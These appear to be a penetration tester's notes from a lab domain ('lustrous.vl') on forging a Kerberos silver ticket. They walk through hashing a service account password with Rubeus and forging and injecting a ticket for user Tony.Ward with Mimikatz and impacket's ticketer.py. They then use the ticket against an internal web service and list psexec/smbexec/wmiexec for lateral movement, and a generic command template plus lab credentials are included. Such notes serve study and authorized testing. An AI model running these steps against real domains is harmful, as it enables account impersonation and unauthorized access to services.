Forge a TGS (service ticket) for a particular service using the password or NTLM hash of the account that owns the SPN.

For example:

- SPN: `HTTP/lusdc.lustrous.vl` - owned by the account `web_svc`
- Target User : `Tony.Ward` because we want to log into a web service as him
### Windows

- Need the SID of the domain (`S-1-5-21-2355092754-1584501958-1513963426`)

![[Pasted image 20250606145243.png]]

- Need the ID of the target user (1114):

![[Pasted image 20250606145312.png]]

- Need the NTLMv1 hash of the SPN service account:
		Password: `iydgTvmujl6f`

```bash
PS C:\Windows\Tasks> .\Rubeus.exe hash /password:iydgTvmujl6f

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0


[*] Action: Calculate Password Hash(es)

[*] Input password             : iydgTvmujl6f
[*]       rc4_hmac             : E67AF8B3D78DF5A02EB0D57B6CB60717

[!] /user:X and /domain:Y need to be supplied to calculate AES and DES hash types!
```

Use `Mimikatz`:

```c
mimikatz.exe

mimikatz # kerberos::purge

mimikatz # kerberos::golden /user:tony.ward /sid:S-1-5-21-2355092754-1584501958-1513963426 /domain:lustrous.vl /target:lusdc.lustrous.vl /service:http /rc4:E67AF8B3D78DF5A02EB0D57B6CB60717 /ptt /id:1114


User      : tony.ward
Domain    : lustrous.vl (LUSTROUS)
SID       : S-1-5-21-2355092754-1584501958-1513963426
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: e67af8b3d78df5a02eb0d57b6cb60717 - rc4_hmac_nt
Service   : http
Target    : lusdc.lustrous.vl
Lifetime  : 6/6/2025 1:32:45 PM ; 6/4/2035 1:32:45 PM ; 6/4/2035 1:32:45 PM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'tony.ward @ lustrous.vl' successfully submitted for current session
```

Ticket is now in use:

```bash
c:\Windows\Tasks>klist

Current LogonId is 0:0x3e7

Cached Tickets: (1)

#0>     Client: tony.ward @ lustrous.vl
        Server: http/lusdc.lustrous.vl @ lustrous.vl
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
        Start Time: 6/6/2025 13:54:10 (local)
        End Time:   6/4/2035 13:54:10 (local)
        Renew Time: 6/4/2035 13:54:10 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called:
```

Summary:

```c
kerberos::golden /user:<target_user> /domain:<domain_name> /sid:<domain_SID> /target:<service_host> /service:<kerberos_service> /rc4:<NTLM_or_password_hash> /ptt /id:<user_SID>
```

Can use this to log into website:

```bash
curl.exe --negotiate -u : http://lusdc.lustrous.vl/internal -v
```

Using Linux - Regenerate TGS

```bash
ticketer.py -nthash E67AF8B3D78DF5A02EB0D57B6CB60717 -domain-sid S-1-5-21-2355092754-1584501958-1513963426 -domain lustrous.vl -spn http/lusdc.lustrous.vl -user-id 1114 tony.ward
```

Import Ticket:

```bash
export KRB5CCNAME=$(pwd)/tony.ward.ccache
```

See Ticket:

```bash
klist
Ticket cache: FILE:tony.ward.ccache
Default principal: tony.ward@LUSTROUS.VL

Valid starting     Expires            Service principal
06/06/25 14:58:33  04/06/35 14:58:33  http/lusdc.lustrous.vl@LUSTROUS.VL
	renew until 04/06/35 14:58:33
```

Viewing HTTP in Linux appears to be a bit of a pain, but the curl in windows appears be be fine.

If using CIF/SMB:

```bash
psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
```
